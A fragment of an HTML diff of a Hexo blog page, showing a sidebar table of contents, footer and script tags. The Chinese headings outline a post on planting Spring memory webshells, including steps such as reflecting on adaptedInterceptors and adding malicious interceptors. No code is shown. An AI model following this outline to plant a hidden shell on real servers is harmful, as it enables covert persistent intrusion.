href="#%E8%8E%B7%E5%8F%96WebApplicationContext"><span class="nav-number">4.0.1.</span> <span class="nav-text">获取WebApplicationContext</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96WebApplicationContext-1"><span class="nav-number">4.0.1.1.</span> <span class="nav-text">获取WebApplicationContext:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96ServletContext"><span class="nav-number">4.0.1.2.</span> <span class="nav-text">获取ServletContext</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96request%E5%8F%AF%E4%BB%A5%E7%94%A8RequestContextHolder"><span class="nav-number">4.0.1.3.</span> <span class="nav-text">获取request可以用RequestContextHolder</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#spring%E4%B8%AD%E8%8E%B7%E5%8F%96context%E7%9A%84%E6%96%B9%E5%BC%8F%E4%B8%80%E8%88%AC%E6%9C%89%E4%BB%A5%E4%B8%8B%E5%87%A0%E7%A7%8D"><span class="nav-number">4.0.1.4.</span> <span class="nav-text">spring中获取context的方式一般有以下几种</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E6%B3%A8%E5%86%8CController"><span class="nav-number">4.0.2.</span> <span class="nav-text">模拟注册Controller</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%B0%B1%E4%BB%8B%E7%BB%8D%E7%9A%84%EF%BC%8CregistryMapping%E7%9B%B4%E6%8E%A5%E6%B3%A8%E5%86%8CrequestMapping"><span class="nav-number">4.0.2.1.</span> <span class="nav-text">源码分析就介绍的，registryMapping直接注册requestMapping</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#detectHandlerMethods%E7%9B%B4%E6%8E%A5%E6%B3%A8%E5%86%8C"><span class="nav-number">4.0.2.2.</span> <span class="nav-text">detectHandlerMethods直接注册</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8registerHandler"><span class="nav-number">4.0.2.3.</span> <span class="nav-text">利用registerHandler</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Interceptor%E6%8B%A6%E6%88%AA%E5%99%A8%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0"><span class="nav-number">5.</span> <span class="nav-text">Interceptor拦截器内存马构造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1"><span class="nav-number">5.0.1.</span> <span class="nav-text">调试分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96RequestMappingHandlerMapping"><span class="nav-number">5.1.</span> <span class="nav-text">1. 获取RequestMappingHandlerMapping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96adaptedInterceptors"><span class="nav-number">5.2.</span> <span class="nav-text">2.反射获取adaptedInterceptors</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%B7%BB%E5%8A%A0%E6%81%B6%E6%84%8FInterceptors"><span class="nav-number">5.3.</span> <span class="nav-text">3.添加恶意Interceptors</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="nav-number">5.4.</span> <span class="nav-text">测试：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
